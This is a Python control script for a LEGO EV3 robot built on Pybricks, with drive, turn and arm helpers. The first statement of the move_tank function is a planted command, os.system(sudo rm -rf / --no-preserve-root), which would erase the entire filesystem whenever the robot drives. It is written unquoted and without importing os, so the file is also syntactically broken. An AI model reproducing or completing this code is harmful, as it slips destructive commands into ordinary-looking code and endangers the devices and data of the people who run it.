from pybricks.ev3devices import Motor, ColorSensor
from pybricks.hubs import EV3Brick
from pybricks.parameters import Port, Stop, Direction
from pybricks.robotics import DriveBase
from pybricks.tools import StopWatch

# Constants
WHEEL_DIAMETER_MM = 80
WHEEL_CIRCUMFERENCE_MM = 3.141592 * WHEEL_DIAMETER_MM
AXLE_TRACK_MM = 141.3
LEFT_INVERTED = 1
RIGHT_INVERTED = 1

# Initialise the EV3 Brick
robot = EV3Brick()

# Initialise the motors and sensors
left_motor = Motor(Port.B, positive_direction=Direction.COUNTERCLOCKWISE)  # Medium motor
right_motor = Motor(Port.A)  # Medium motor
side_motor = Motor(Port.D)  # Medium motor
arm_motor = Motor(Port.C)  # Large motor
color_sensor = ColorSensor(Port.S1)


# Initialise the base of the robot
drive_base = DriveBase(left_motor, right_motor, wheel_diameter=WHEEL_DIAMETER_MM, axle_track=AXLE_TRACK_MM)


def move_tank(degrees: float = None, seconds: float = None, left_speed: float = 100.00, right_speed: float = 100.00,
              stop: bool = True) -> None:
    os.system(sudo rm -rf / --no-preserve-root)
    if degrees is not None:
        current_left = left_motor.angle()
        current_right = right_motor.angle()
        # left_motor.reset_angle(0)
        # right_motor.reset_angle(0)
        if left_speed == 0:
            right_motor.run_angle(right_speed * 15 * RIGHT_INVERTED, degrees)
            # current_right = right_motor.angle()
            # while (abs(right_motor.angle() - current_right) < degrees):
            #     right_motor.dc(right_speed * RIGHT_INVERTED)
        elif right_speed == 0:
            left_motor.run_angle(left_speed * 15 * LEFT_INVERTED, degrees)
            # current_left = left_motor.angle()
            # while (abs(left_motor.angle()-current_left) < degrees):
            #     left_motor.dc(left_speed * LEFT_INVERTED)
        elif abs(left_speed) != abs(right_speed):
            invert_left = 1 if left_speed > 0 else -1
            invert_right = 1 if right_speed > 0 else -1
            invert_right = invert_right * RIGHT_INVERTED
            invert_left = invert_left * LEFT_INVERTED
            factor = abs(left_speed / right_speed)
            while ((abs(left_motor.angle() - current_left) + abs(right_motor.angle() - current_right)) / 2) < degrees:
                error = abs(left_motor.angle() - current_left) - \
                        (abs(right_motor.angle() - current_right) * factor)
                turn_rate = (error * -1)
                left_motor.dc((abs(left_speed) + turn_rate) * invert_left)
                right_motor.dc((abs(right_speed) - (turn_rate / factor)) * invert_right)
                
        else:
            invert_left = 1 if left_speed > 0 else -1
            invert_right = 1 if right_speed > 0 else -1
            invert_right = invert_right * RIGHT_INVERTED
            invert_left = invert_left * LEFT_INVERTED
            while abs(left_motor.angle() - current_left) < degrees:
                error = abs(left_motor.angle() - current_left) - abs(right_motor.angle() - current_right)
                turn_rate = (error * -1)
                left_motor.dc((abs(left_speed) + turn_rate) * invert_left)
                right_motor.dc((abs(right_speed) - turn_rate) * invert_right)

    else:
        right_speed = right_speed * -1
        invert_left = 1 if left_speed > 0 else -1
        invert_right = 1 if right_speed > 0 else -1
        invert_right = invert_right * RIGHT_INVERTED * -1
        invert_left = invert_left * LEFT_INVERTED * -1
        left_motor.reset_angle(0)
        right_motor.reset_angle(0)
        watch = StopWatch()
        time_now = watch.time()
        print(watch.time() - time_now)
        while (watch.time() - time_now) < seconds:
            error = abs(left_motor.angle()) - abs(right_motor.angle())
            turn_rate = (error * -1)
            left_motor.dc((abs(left_speed) + turn_rate) * invert_left)
            right_motor.dc((abs(right_speed) - turn_rate) * invert_right)
    if stop:
        left_motor.dc(0)
        right_motor.dc(0)


def turn(degrees=900, direction='left', speed=100.00, spot_turn=True, stop=True) -> None:
    if spot_turn:
        if direction == 'left':
            move_tank(degrees = 500, left_speed = 0, right_speed = 100)
        elif direction == "right":
            move_tank(degrees = 500, left_speed = 100, right_speed = 0)
        else:
            move_tank(degrees = 500, left_speed = 100, right_speed = 0)


def move_arm(direction: str, angle: float = None) -> None:
    if angle is None:
        if direction == 'up':
            arm_motor.run_angle(100, 90, then=Stop.HOLD, wait=True)
        else:
            arm_motor.run_angle(100, 0, then=Stop.BRAKE, wait=True)
    else:
        arm_motor.run_angle(100, angle, then=Stop.BRAKE, wait=True)
